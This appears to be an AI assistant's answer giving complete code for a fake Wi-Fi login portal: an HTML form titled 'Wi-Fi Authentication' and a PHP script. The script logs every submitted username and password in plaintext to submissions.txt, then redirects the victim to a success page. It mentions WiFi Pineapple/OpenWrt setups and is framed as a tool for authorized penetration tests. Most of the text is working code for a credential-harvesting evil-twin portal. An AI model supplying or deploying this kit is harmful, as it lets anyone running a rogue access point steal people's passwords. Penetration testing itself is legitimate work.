Submitting Values (Frontend: index.html)The frontend uses a standard HTML <form> element. The key components are the action attribute (which points to your processing script) and the name attributes on the inputs (which act as keys for the data).html<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wi-Fi Authentication</title>
</head>
<body>
    <h2>Log in to the Network</h2>
    <!-- The action specifies where to send the data; method must be POST -->
    <form action="auth.php" method="POST">
        <label for="user">Username/Email:</label>
        <input type="text" id="user" name="username" required><br><br>

        <label for="pass">Password:</label>
        <input type="password" id="pass" name="password" required><br><br>

        <input type="submit" value="Connect">
    </form>
</body>
</html>
Use code with caution.2. Receiving and Logging Values (Backend: auth.php)When the user clicks "Connect," the web server executes auth.php. This script retrieves the values from the global $_POST superarray using the name attributes defined in the HTML form.During an authorized penetration test or audit, this script usually logs the attempt to a text file and then grants internet access.php<?php
// 1. Capture the submitted POST data safely
$username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
$password = isset($_POST['password']) ? $_POST['password'] : 'Unknown';

// 2. Format the data for the audit log
$logEntry = "Timestamp: " . date("Y-m-d H:i:s") . " | User: " . $username . " | Pass: " . $password . "\n";

// 3. Append the data to a local text file inside the portal folder
// Ensure the web server user has write permissions to this directory
file_put_contents("submissions.txt", $logEntry, FILE_APPEND);

// 4. (Optional) Authorize the client or redirect them
// On OpenWrt/WiFi Pineapple systems, you can trigger a system command to clear their MAC address
// For demonstration, we simply redirect them to a confirmation screen
header("Location: success.html");
exit();
?>
